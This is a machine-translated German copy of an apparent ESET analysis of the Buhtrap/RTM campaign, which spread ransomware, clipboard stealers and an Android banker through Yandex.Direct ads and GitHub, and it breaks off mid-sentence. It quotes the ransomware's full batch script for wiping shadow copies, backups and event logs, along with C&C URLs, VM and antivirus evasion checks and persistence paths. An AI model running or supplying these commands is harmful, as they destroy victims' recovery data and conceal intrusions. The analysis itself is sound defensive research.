<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèø‚Äçüéì üëêüèæ üöπ Die Hintert√ºr und der Buhtrap-Verschl√ºsseler wurden mit Yandex.Direct verteilt üßëüèæ‚Äçü§ù‚Äçüßëüèª üî≤ üñ§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Um einen Cyberangriff auf Buchhalter zu zielen, k√∂nnen Sie die Arbeitsdokumente verwenden, nach denen sie im Netzwerk suchen. So etwas war in den letz...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Die Hintert√ºr und der Buhtrap-Verschl√ºsseler wurden mit Yandex.Direct verteilt</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/450126/"> Um einen Cyberangriff auf Buchhalter zu zielen, k√∂nnen Sie die Arbeitsdokumente verwenden, nach denen sie im Netzwerk suchen.  So etwas war in den letzten Monaten eine Cyber-Gruppe, die die bekannten Backdoors <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Buhtrap</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">RTM</a> sowie Verschl√ºsseler und Software zum Stehlen von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kryptow√§hrungen</a> vertreibt.  Die meisten Ziele befinden sich in Russland.  Der Angriff wird durch Platzieren b√∂sartiger Anzeigen in Yandex.Direct implementiert.  Potenzielle Opfer gingen zu einer Website, auf der sie aufgefordert wurden, eine als Dokumentvorlage getarnte sch√§dliche Datei herunterzuladen.  Yandex hat nach unserer Warnung sch√§dliche Anzeigen entfernt. <br><br>  Buhtrap-Quellcode wurde in der Vergangenheit in das Netzwerk integriert, sodass jeder ihn verwenden kann.  Wir haben keine Informationen zur Verf√ºgbarkeit von RTM-Code. <br><br>  In einem Beitrag erfahren Sie, wie Angreifer Malware mithilfe von Yandex.Direct verbreitet und auf GitHub gehostet haben.  Die Stelle wird durch eine technische Analyse der Malvari erg√§nzt. <br><br><img src="https://habrastorage.org/webt/y3/h0/ly/y3h0lyhh0aq4jl6dwpvaia-vf2q.png"><br><br><a name="habracut"></a><h2>  Buhtrap und RTM wieder im Gesch√§ft </h2><br><h4>  Verteilungsmechanismus und Opfer </h4><br>  Die verschiedenen Nutzlasten, die an die Opfer geliefert werden, werden durch einen gemeinsamen Verteilungsmechanismus vereint.  Alle von Cyberkriminellen erstellten sch√§dlichen Dateien befanden sich in zwei verschiedenen GitHub-Repositorys. <br><br>  Normalerweise wurde im Repository eine sch√§dliche Datei heruntergeladen, die sich h√§ufig √§nderte.  Da Sie den Verlauf der √Ñnderungen im Repository auf GitHub sehen k√∂nnen, k√∂nnen wir sehen, welche Art von Malware sich in einem bestimmten Zeitraum verbreitet hat.  Um das Opfer davon zu √ºberzeugen, eine sch√§dliche Datei herunterzuladen, wurde die in der obigen Abbildung gezeigte Site blanki-shabloni24 [.] Ru verwendet. <br><br>  Das Design der Website und alle Namen der sch√§dlichen Dateien sind in einem einzigen Konzept konsistent - Formulare, Vorlagen, Vertr√§ge, Beispiele usw. Da Buhtrap- und RTM-Software in der Vergangenheit bei Angriffen auf Buchhalter verwendet wurden, gingen wir davon aus, dass die Strategie in der neuen Kampagne dieselbe ist.  Die Frage ist nur, wie das Opfer auf die Baustelle der Angreifer gelangt ist. <br><br><h4>  Infektion </h4><br>  Zumindest einige potenzielle Opfer auf dieser Website wurden von b√∂swilliger Werbung angezogen.  Das Folgende ist eine Beispiel-URL: <br><br> <code>https://blanki-shabloni24.ru/?utm_source=yandex&amp;utm_medium=banner&amp;utm_campaign=cid|{blanki_rsya}|context&amp;utm_content=gid|3590756360|aid|6683792549|15114654950_&amp;utm_term=  &amp;pm_source=bb.f2.kz&amp;pm_block=none&amp;pm_position=0&amp;yclid=1029648968001296456</code> <br> <br>  Wie Sie dem Link entnehmen k√∂nnen, wurde das Banner im legitimen Buchhaltungsforum bb.f2 [.] Kz ver√∂ffentlicht.  Es ist wichtig zu beachten, dass Banner auf verschiedenen Websites angezeigt wurden, alle dieselbe Kampagnen-ID (blanki_rsya) hatten und sich haupts√§chlich auf Buchhaltungs- oder Rechtshilfedienste bezogen.  Aus der URL geht hervor, dass das potenzielle Opfer das Anforderungsformular ‚ÄûKonto herunterladen‚Äú verwendet hat, was unsere Hypothese √ºber gezielte Angriffe best√§tigt.  Nachfolgend sind die Websites aufgef√ºhrt, auf denen die Banner und die zugeh√∂rigen Suchanfragen angezeigt wurden. <br><br><ul><li>  Kontoformular herunterladen - bb.f2 [.] kz </li><li>  Mustervertrag - Ipopen [.] en </li><li>  Aussage Beschwerde Probe - 77metrov [.] ru </li><li>  Vertragsformular - blank-dogovor-kupli-prodazhi [.] en </li><li>  Petitionsbeispiel - zen.yandex [.] ru </li><li>  Beispielbeschwerde - yurday [.] en </li><li>  Mustervertragsformulare - Regforum [.] en </li><li>  Vertragsform - assistentus [.] en </li><li>  Musterwohnungsvereinbarung - napravah [.] com </li><li>  legale Vertragsproben - avito [.] ru </li></ul><br>  Die Stelle blanki-shabloni24 [.] Ru wurde m√∂glicherweise f√ºr eine einfache visuelle Beurteilung eingerichtet.  Werbung, die zu einer professionell aussehenden Website mit einem Link zu GitHub f√ºhrt, sieht in der Regel nicht nach etwas offensichtlich Schlechtem aus.  Dar√ºber hinaus haben Angreifer sch√§dliche Dateien nur f√ºr einen begrenzten Zeitraum, wahrscheinlich w√§hrend der Kampagne, in das Repository hochgeladen.  Der gr√∂√üte Teil des Repositorys auf GitHub war ein leeres Zip-Archiv oder eine saubere Exe-Datei.  Auf diese Weise konnten Angreifer Werbung √ºber Yandex.Direct auf Websites verbreiten, die h√∂chstwahrscheinlich von Buchhaltern besucht wurden, die f√ºr bestimmte Suchanfragen kamen. <br><br>  Betrachten Sie als n√§chstes die verschiedenen Nutzlasten, die auf diese Weise verteilt werden. <br><br><h2>  Nutzlastanalyse </h2><br><h4>  Verteilungszeitleiste </h4><br>  Die Malware-Kampagne begann Ende Oktober 2018 und ist zum Zeitpunkt des Schreibens des Beitrags aktiv.  Da das gesamte Repository auf GitHub √∂ffentlich verf√ºgbar war, haben wir eine genaue Chronologie der Verteilung von sechs verschiedenen Malware-Familien zusammengestellt (siehe Abbildung unten).  Wir haben eine Linie hinzugef√ºgt, die den Moment anzeigt, in dem eine Bannerverbindung gem√§√ü ESET-Telemetrie erkannt wurde, um sie mit dem Git-Verlauf zu vergleichen.  Wie Sie sehen k√∂nnen, korreliert dies gut mit der Verf√ºgbarkeit der Nutzdaten auf GitHub.  Die Diskrepanz Ende Februar kann durch das Fehlen eines Teils des √Ñnderungsverlaufs erkl√§rt werden, da das Repository aus GitHub gel√∂scht wurde, bevor wir es vollst√§ndig erhalten konnten. <br><br><img src="https://habrastorage.org/webt/sa/ua/1i/saua1i6vupxtv2pa-tvwawje8em.png"><br>  <i>Abbildung 1. Chronologie der Verteilung von Malvari.</i> <br><br><h4>  Zertifikatsignaturzertifikate </h4><br>  Die Kampagne verwendete viele Zertifikate.  Einige haben mehr als eine Malware-Familie signiert, was zus√§tzlich darauf hinweist, dass verschiedene Beispiele zur selben Kampagne geh√∂ren.  Trotz der Verf√ºgbarkeit des privaten Schl√ºssels haben die Bediener die Bin√§rdateien nicht systematisch signiert und den Schl√ºssel nicht f√ºr alle Beispiele verwendet.  Ende Februar 2019 begannen Angreifer, ung√ºltige Signaturen mit einem Zertifikat von Google zu erstellen, f√ºr das sie keinen privaten Schl√ºssel haben. <br><br>  Alle an der Kampagne beteiligten Zertifikate und die von ihnen unterzeichneten Malvari-Familien sind in der folgenden Tabelle aufgef√ºhrt. <br><br><img src="https://habrastorage.org/webt/wg/q_/-8/wgq_-807r6mtilzeam28lhbbrvi.png"><br><br>  Wir haben diese Codesignaturzertifikate auch verwendet, um mit anderen Malware-Familien zu kommunizieren.  Bei den meisten Zertifikaten wurden keine Beispiele gefunden, die nicht √ºber das GitHub-Repository verteilt w√ºrden.  Das TOV-Zertifikat ‚ÄûMARIYA‚Äú wurde jedoch verwendet, um die Malvari zu signieren, die dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Botnetz</a> , der Adware und den Bergleuten von Wauchos geh√∂rt.  Es ist unwahrscheinlich, dass diese Malware mit dieser Kampagne in Verbindung gebracht wird.  H√∂chstwahrscheinlich wurde das Zertifikat im Darknet gekauft. <br><br><h4>  Win32 / Filecoder.Buhtrap </h4><br>  Die erste Komponente, die unsere Aufmerksamkeit auf sich zog, war die erste entdeckte Win32 / Filecoder.Buhtrap.  Dies ist eine Delphi-Bin√§rdatei, die manchmal gepackt werden kann.  Es wurde haupts√§chlich von Februar bis M√§rz 2019 vertrieben.  Es verh√§lt sich wie ein Ransomware-Programm - es sucht nach lokalen Festplatten und Netzwerkordnern und verschl√ºsselt die erkannten Dateien.  Um Kompromisse einzugehen, ben√∂tigt er keine Internetverbindung, da er den Server nicht kontaktiert, um Verschl√ºsselungsschl√ºssel zu senden.  Stattdessen f√ºgt er am Ende der R√ºckkaufnachricht ein ‚ÄûToken‚Äú hinzu und schl√§gt vor, E-Mail oder Bitmessage f√ºr die Kommunikation mit den Betreibern zu verwenden. <br><br>  Um so viele wichtige Ressourcen wie m√∂glich zu verschl√ºsseln, startet Filecoder.Buhtrap einen Stream zum Herunterfahren von Schl√ºsselsoftware, die m√∂glicherweise offene Dateihandler mit wertvollen Informationen enth√§lt, die die Verschl√ºsselung beeintr√§chtigen k√∂nnen.  Zielprozesse sind haupts√§chlich Datenbankverwaltungssysteme (DBMS).  Dar√ºber hinaus l√∂scht Filecoder.Buhtrap Protokolldateien und Sicherungen, um die Datenwiederherstellung zu erschweren.  Dazu wird das folgende Batch-Skript ausgef√ºhrt. <br><br> <code>bcdedit /set {default} bootstatuspolicy ignoreallfailures <br> bcdedit /set {default} recoveryenabled no <br> wbadmin delete catalog -quiet <br> wbadmin delete systemstatebackup <br> wbadmin delete systemstatebackup -keepversions:0 <br> wbadmin delete backup <br> wmic shadowcopy delete <br> vssadmin delete shadows /all /quiet <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f <br> reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" <br> attrib "%userprofile%\documents\Default.rdp" -s -h <br> del "%userprofile%\documents\Default.rdp" <br> wevtutil.exe clear-log Application <br> wevtutil.exe clear-log Security <br> wevtutil.exe clear-log System <br> sc config eventlog start=disabled</code> <br> <br>  Filecoder.Buhtrap verwendet den legitimen Onlinedienst IP Logger, der zum Sammeln von Informationen √ºber Website-Besucher erstellt wurde.  Dies soll die Opfer des Encoders verfolgen, f√ºr den die Kommandozeile verantwortlich ist: <br><br> <code>mshta.exe "javascript:document.write('');"</code> <br> <br>  Dateien f√ºr die Verschl√ºsselung werden im Falle einer Nicht√ºbereinstimmung in den drei Ausnahmelisten ausgew√§hlt.  Erstens werden Dateien mit den folgenden Erweiterungen nicht verschl√ºsselt: .com, .cmd, .cpl, .dll, .exe, .hta, .lnk, .msc, .msi, .msp, .pif, .scr, .sys und .bat.  Zweitens werden alle Dateien ausgeschlossen, f√ºr die der vollst√§ndige Pfad Verzeichniszeilen aus der folgenden Liste enth√§lt. <br><br> <code>\.{ED7BA470-8E54-465E-825C-99712043E01C}\ <br> \tor browser\ <br> \opera\ <br> \opera software\ <br> \mozilla\ <br> \mozilla firefox\ <br> \internet explorer\ <br> \google\chrome\ <br> \google\ <br> \boot\ <br> \application data\ <br> \apple computer\safari\ <br> \appdata\ <br> \all users\ <br> :\windows\ <br> :\system volume information\ <br> :\nvidia\ <br> :\intel\</code> <br> <br>  Drittens werden auch bestimmte Dateinamen von der Verschl√ºsselung ausgeschlossen, darunter der Name der Nachrichtendatei mit L√∂segeldforderung.  Die Liste ist unten dargestellt.  Offensichtlich sind alle diese Ausnahmen darauf ausgelegt, die F√§higkeit zum Starten der Maschine zu erhalten, jedoch mit minimaler Verwendbarkeit. <br><br> <code>boot.ini <br> bootfont.bin <br> bootsect.bak <br> desktop.ini <br> iconcache.db <br> ntdetect.com <br> ntldr <br> ntuser.dat <br> ntuser.dat.log <br> ntuser.ini <br> thumbs.db <br> winupas.exe <br> your files are now encrypted.txt <br> windows update assistant.lnk <br> master.exe <br> unlock.exe <br> unlocker.exe</code> <br> <br><h4>  Dateiverschl√ºsselungsschema </h4><br>  Nach dem Start generiert die Malware ein Paar 512-Bit-RSA-Schl√ºssel.  Der private Exponent (d) und das Modul (n) werden dann mit einem fest codierten √∂ffentlichen 2048-Bit-Schl√ºssel (√∂ffentlicher Exponent und Modul) verschl√ºsselt, in zlib-Wrapped und in base64 codiert.  Der daf√ºr verantwortliche Code ist in Abbildung 2 dargestellt. <br><br><img src="https://habrastorage.org/webt/c_/p_/g9/c_p_g9rfnoggxyffe9jedxgibrk.png"><br>  <i>Abbildung 2. Das Ergebnis der Hex-Rays-Dekompilierung des Prozesses zum Generieren eines 512-Bit-RSA-Schl√ºsselpaars.</i> <br><br>  Das Folgende ist ein Beispiel f√ºr einfachen Text mit einem generierten privaten Schl√ºssel, der ein Token ist, das an die L√∂segeldnachricht angeh√§ngt ist. <br><br> <code>DF9228F4F3CA93314B7EE4BEFC440030665D5A2318111CC3FE91A43D781E3F91BD2F6383E4A0B4F503916D75C9C576D5C2F2F073ADD4B237F7A2B3BF129AE2F399197ECC0DD002D5E60C20CE3780AB9D1FE61A47D9735036907E3F0CF8BE09E3E7646F8388AAC75FF6A4F60E7F4C2F697BF6E47B2DBCDEC156EAD854CADE53A239</code> <br> <br>  Der √∂ffentliche Schl√ºssel des Angreifers wird unten angezeigt. <br><br> <code>e = 0x72F750D7A93C2C88BFC87AD4FC0BF4CB45E3C55701FA03D3E75162EB5A97FDA7ACF8871B220A33BEDA546815A9AD9AA0C2F375686F5009C657BB3DF35145126C71E3C2EADF14201C8331699FD0592C957698916FA9FEA8F0B120E4296193AD7F3F3531206608E2A8F997307EE7D14A9326B77F1B34C4F1469B51665757AFD38E88F758B9EA1B95406E72B69172A7253F1DFAA0FA02B53A2CC3A7F0D708D1A8CAA30D954C1FEAB10AD089EFB041DD016DCAAE05847B550861E5CACC6A59B112277B60AC0E4E5D0EA89A5127E93C2182F77FDA16356F4EF5B7B4010BCCE1B1331FCABFFD808D7DAA86EA71DFD36D7E701BD0050235BD4D3F20A97AAEF301E785005 <br> n = 0x212ED167BAC2AEFF7C3FA76064B56240C5530A63AB098C9B9FA2DE18AF9F4E1962B467ABE2302C818860F9215E922FC2E0E28C0946A0FC746557722EBB35DF432481AC7D5DDF69468AF1E952465E61DDD06CDB3D924345A8833A7BC7D5D9B005585FE95856F5C44EA917306415B767B684CC85E7359C23231C1DCBBE714711C08848BEB06BD287781AEB53D94B7983EC9FC338D4320129EA4F568C410317895860D5A85438B2DA6BB3BAAE9D9CE65BCEA6760291D74035775F28DF4E6AB1A748F78C68AB07EA166A7309090202BB3F8FBFC19E44AC0B4D3D0A37C8AA5FA90221DA7DB178F89233E532FF90B55122B53AB821E1A3DB0F02524429DEB294B3A4EDD</code> <br> <br>  Dateien werden mit AES-128-CBC mit einem 256-Bit-Schl√ºssel verschl√ºsselt.  F√ºr jede verschl√ºsselte Datei werden ein neuer Schl√ºssel und ein neuer Initialisierungsvektor generiert.  Wichtige Informationen werden am Ende der verschl√ºsselten Datei hinzugef√ºgt.  Betrachten Sie das verschl√ºsselte Dateiformat. <br>  Verschl√ºsselte Dateien haben den folgenden Header: <br><br><img src="https://habrastorage.org/webt/lo/-e/7m/lo-e7mo1l2ta7ie0n2rlz0ybirs.png"><br><br>  Die Daten der Quelldatei mit dem zus√§tzlichen magischen VEGA-Wert werden bis zu den ersten 0x5000 Bytes verschl√ºsselt.  Alle Informationen zur Entschl√ºsselung werden an eine Datei mit folgender Struktur angeh√§ngt: <br><br><img src="https://habrastorage.org/webt/iw/hy/az/iwhyaz2vw5c45i6vk0s4hs_sadq.png"><br><br>  - Die Dateigr√∂√üenmarkierung enth√§lt eine Beschriftung, die angibt, ob die Datei gr√∂√üer als 0x5000 Byte ist <br>  - AES-Schl√ºssel-Blob = ZlibCompress (RSAEncrypt (AES-Schl√ºssel + IV, √∂ffentlicher Schl√ºssel des generierten RSA-Schl√ºsselpaars) <br>  - RSA-Schl√ºssel-Blob = ZlibCompress (RSAEncrypt (generierter privater RSA-Schl√ºssel, fest codierter √∂ffentlicher RSA-Schl√ºssel)) <br><br><h4>  Win32 / ClipBanker </h4><br>  Win32 / ClipBanker ist eine Komponente, die von Ende Oktober bis Anfang Dezember 2018 zeitweise verteilt wurde.  Seine Aufgabe ist es, den Inhalt der Zwischenablage zu verfolgen, er sucht nach den Adressen von Kryptow√§hrungs-Wallets.  Nachdem ClipBanker die Adresse der Zielbrieftasche ermittelt hat, ersetzt sie diese durch die Adresse, die angeblich den Betreibern geh√∂rt.  Die von uns untersuchten Proben waren weder verpackt noch verschleiert.  Der einzige Mechanismus zum Maskieren des Verhaltens ist die Zeichenfolgenverschl√ºsselung.  Die Adressen der Geldb√∂rsen der Bediener werden mit RC4 verschl√ºsselt.  Ziel-Kryptow√§hrungen - Bitcoin, Bitcoin-Bargeld, Dogecoin, Ethereum und Ripple. <br><br>  W√§hrend des Malware-Verteilungszeitraums wurde ein kleiner Betrag an das MTC an die Bitcoin-Brieftaschen des Angreifers gesendet, was den Erfolg der Kampagne in Frage stellt.  Dar√ºber hinaus gibt es keinen Grund anzunehmen, dass diese Transaktionen im Allgemeinen mit ClipBanker zusammenh√§ngen. <br><br><h4>  Win32 / RTM </h4><br>  Die Win32 / RTM-Komponente wurde Anfang M√§rz 2019 f√ºr mehrere Tage verteilt.  RTM ist ein in Delphi ans√§ssiger Trojaner-Banker, der sich an Remote-Bankensysteme richtet.  Im Jahr 2017 ver√∂ffentlichten ESET-Forscher eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">detaillierte Analyse</a> dieses Programms, die Beschreibung ist immer noch relevant.  Im Januar 2019 ver√∂ffentlichte Palo Alto Networks auch <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">einen Blogbeitrag √ºber RTM</a> . <br><br><h4>  Buhtrap Downloader </h4><br>  Im Gegensatz zu fr√ºheren Buhtrap-Tools war auf GitHub f√ºr einige Zeit ein Downloader verf√ºgbar.  Es geht f√ºr den n√§chsten Schritt zu <code>https://94.100.18[.]67/RSS.php?&lt;some_id&gt;</code> und l√§dt es direkt in den Speicher.  Es k√∂nnen zwei Verhaltensweisen des Codes der zweiten Stufe unterschieden werden.  In der ersten URL hat RSS.php die Buhtrap-Hintert√ºr direkt passiert - diese Hintert√ºr ist der nach dem Quellcode-Leck verf√ºgbaren sehr √§hnlich. <br><br>  Interessanterweise sehen wir mehrere Kampagnen mit einer Buhtrap-Hintert√ºr, die vermutlich von verschiedenen Betreibern geleitet werden.  In diesem Fall besteht der Hauptunterschied darin, dass die Hintert√ºr direkt in den Speicher geladen wird und nicht das √ºbliche Schema f√ºr den DLL-Bereitstellungsprozess verwendet, √ºber den wir <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zuvor</a> gesprochen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">haben</a> .  Dar√ºber hinaus haben die Betreiber den RC4-Schl√ºssel ge√§ndert, mit dem der Netzwerkverkehr zum C &amp; C-Server verschl√ºsselt wird.  In den meisten Kampagnen, die wir gesehen haben, war es den Betreibern nicht wichtig, diesen Schl√ºssel zu √§ndern. <br><br>  Das zweite, komplexere Verhalten - die RSS.php-URL wurde von einem anderen Loader √ºbergeben.  Es wurde eine Verschleierung implementiert, z. B. das Neuerstellen einer dynamischen Importtabelle.  Der Bootloader dient dazu, den C &amp; C-Server <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">msiofficeupd</a> [.] Com / api / F27F84EDA4D13B15 / 2 zu kontaktieren, Protokolle zu senden und auf eine Antwort zu warten.  Es verarbeitet die Antwort als Blob, l√§dt sie in den Speicher und f√ºhrt sie aus.  Die Nutzlast, die wir beim Ausf√ºhren dieses Laders gesehen haben, war dieselbe Buhtrap-Hintert√ºr, aber m√∂glicherweise sind andere Komponenten vorhanden. <br><br><h4>  Android / Spy.Banker </h4><br>  Interessanterweise wurde auch eine Komponente f√ºr Android im GitHub-Repository gefunden.  Er war nur einen Tag in der Hauptniederlassung - am 1. November 2018.  ESET-Telemetrie wird nicht nur auf GitHub gehostet, sondern findet auch keine Hinweise auf die Verbreitung dieser Malware. <br><br>  Die Komponente wurde als Android Application Package (APK) gehostet.  Er ist sehr verschleiert.  B√∂swilliges Verhalten ist in der verschl√ºsselten JAR in der APK versteckt.  Es ist RC4-verschl√ºsselt mit diesem Schl√ºssel: <br><br> <code>key = [ <br> 0x87, 0xd6, 0x2e, 0x66, 0xc5, 0x8a, 0x26, 0x00, 0x72, 0x86, 0x72, 0x6f, <br> 0x0c, 0xc1, 0xdb, 0xcb, 0x14, 0xd2, 0xa8, 0x19, 0xeb, 0x85, 0x68, 0xe1, <br> 0x2f, 0xad, 0xbe, 0xe3, 0xb9, 0x60, 0x9b, 0xb9, 0xf4, 0xa0, 0xa2, 0x8b, 0x96 <br> ]</code> <br> <br>  Der gleiche Schl√ºssel und Algorithmus werden zum Verschl√ºsseln von Zeichenfolgen verwendet.  JAR befindet sich in <code>APK_ROOT + image/files</code> .  Die ersten 4 Bytes der Datei enthalten die L√§nge der verschl√ºsselten JAR, die unmittelbar nach dem L√§ngenfeld beginnt. <br><br>  Nachdem wir die Datei entschl√ºsselt hatten, stellten wir fest, dass es sich um Anubis handelt - einen zuvor <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dokumentierten</a> Banker f√ºr Android.  Sch√§dliche Software hat folgende Funktionen: <br><br><ul><li>  Mikrofonaufnahme </li><li>  Screenshots machen </li><li>  GPS-Koordinaten erhalten </li><li>  Keylogger </li><li>  Ger√§tedatenverschl√ºsselung und L√∂segeldforderung </li><li>  Spam </li></ul><br>  Interessanterweise nutzte der Banker Twitter als Backup-Kommunikationskanal, um einen weiteren C &amp; C-Server zu erhalten.  Die von uns analysierte Stichprobe verwendete das @ JohnsTrader-Konto, war jedoch zum Zeitpunkt der Analyse bereits gesperrt. <br><br>  Der Banker enth√§lt eine Liste der Zielanwendungen auf einem Android-Ger√§t.  Es ist l√§nger geworden als die Liste aus der Sophos-Studie.  Die Liste enth√§lt viele Bankanwendungen, Online-Einkaufsprogramme wie Amazon und eBay sowie Kryptow√§hrungsdienste. <br><br><h4>  MSIL / ClipBanker.IH </h4><br>  Die letzte Komponente, die im Rahmen dieser Kampagne verteilt wurde, war die ausf√ºhrbare .NET Windows-Datei, die im M√§rz 2019 ver√∂ffentlicht wurde.  Die meisten der untersuchten Versionen wurden von ConfuserEx v1.0.0 gepackt.  Wie ClipBanker verwendet diese Komponente die Zwischenablage.  Ihr Ziel ist eine breite Palette von Kryptow√§hrungen sowie Angebote auf Steam.  Dar√ºber hinaus wird der IP-Logger-Dienst verwendet, um den privaten WIF-Schl√ºssel von Bitcoin zu stehlen. <br><br>  Schutzmechanismen <br>  Zus√§tzlich zu den Vorteilen, die ConfuserEx in Form von Debugging, Dumping und Manipulation bietet, kann die Komponente Antivirenprodukte und virtuelle Maschinen erkennen. <br><br>  Um den Start in einer virtuellen Maschine zu √ºberpr√ºfen, verwendet die Malware die in Windows integrierte WMI-Befehlszeile (WMIC), um Informationen zum BIOS anzufordern, n√§mlich: <br><br> <code>wmic bios</code> <br> <br>  Anschlie√üend analysiert das Programm die Ausgabe des Befehls und sucht nach Schl√ºsselw√∂rtern: VBOX, VirtualBox, XEN, qemu, bochs, VM. <br><br>  Um Antivirenprodukte zu erkennen, sendet Malware mithilfe der <code>ManagementObjectSearcher</code> API eine WMI-Anforderung (Windows Management Instrumentation) an das Windows-Sicherheitscenter.  Nach dem Dekodieren von base64 sieht der Aufruf folgenderma√üen aus: <br><br> <code>ManagementObjectSearcher('root\\SecurityCenter2', 'SELECT * FROM AntivirusProduct')</code> <br> <br><img src="https://habrastorage.org/webt/wb/xv/tv/wbxvtvcwmxo9w45kjramkqmcy-s.png"><br>  <i>Abbildung 3. Der Prozess zur Bestimmung von Antivirenprodukten.</i> <br><br>  Dar√ºber hinaus √ºberpr√ºft die Malware, ob <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">CryptoClipWatcher</a> , ein Tool zum Schutz vor Angriffen in der Zwischenablage, ausgef√ºhrt wird. Wenn es ausgef√ºhrt wird, werden alle Threads dieses Prozesses <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">angehalten</a> , wodurch der Schutz deaktiviert wird. <br><br><h4>  Ausdauer </h4><br>  Die von uns untersuchte Malware-Version kopiert sich selbst in <code>%APPDATA%\google\updater.exe</code> und setzt das Attribut "hidden" auf das Google-Verzeichnis.  Anschlie√üend wird der Wert von <code>Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell</code> in der Windows-Registrierung <code>updater.exe</code> und der Pfad <code>updater.exe</code> .  Malware wird also jedes Mal ausgef√ºhrt, wenn sich ein Benutzer anmeldet. <br><br><h4>  B√∂sartiges Verhalten </h4><br>  Wie ClipBanker √ºberwacht die Malware den Inhalt der Zwischenablage und sucht nach den Adressen von Kryptow√§hrungs-Wallets. Wenn sie gefunden wird, ersetzt sie diese durch eine der Adressen des Bedieners.  Unten finden Sie eine Liste der Zieladressen basierend auf den Angaben im Code. <br><br> <code>BTC_P2PKH, BTC_P2SH, BTC_BECH32, BCH_P2PKH_CashAddr, BTC_GOLD, LTC_P2PKH, LTC_BECH32, LTC_P2SH_M, ETH_ERC20, XMR, DCR, XRP, DOGE, DASH, ZEC_T_ADDR, ZEC_Z_ADDR, STELLAR, NEO, ADA, IOTA, NANO_1, NANO_3, BANANO_1, BANANO_3, STRATIS, NIOBIO, LISK, QTUM, WMZ, WMX, WME, VERTCOIN, TRON, TEZOS, QIWI_ID, YANDEX_ID, NAMECOIN, B58_PRIVATEKEY, STEAM_URL</code> <br> <br>  F√ºr jeden Adresstyp gibt es einen entsprechenden regul√§ren Ausdruck.  Der Wert STEAM_URL wird verwendet, um das Steam-System anzugreifen, wie aus dem regul√§ren Ausdruck ersichtlich ist, der zur Bestimmung im Puffer verwendet wird: <br><br> <code>\b(https:\/\/|http:\/\/|)steamcommunity\.com\/tradeoffer\/new\/\?partner=[0-9]+&amp;token=[a-zA-Z0-9]+\b</code> <br> <br><h4>  Exfiltrationskanal </h4><br>  Die Malware ersetzt nicht nur Adressen im Puffer, sondern richtet sich auch an private WIF-Schl√ºssel von Bitcoin-, Bitcoin Core- und Electrum Bitcoin-Geldb√∂rsen.  Das Programm verwendet plogger.org als Exfiltrationskanal, um den privaten WIF-Schl√ºssel zu erhalten.  Zu diesem Zweck f√ºgen die Operatoren die privaten Schl√ºsseldaten zum 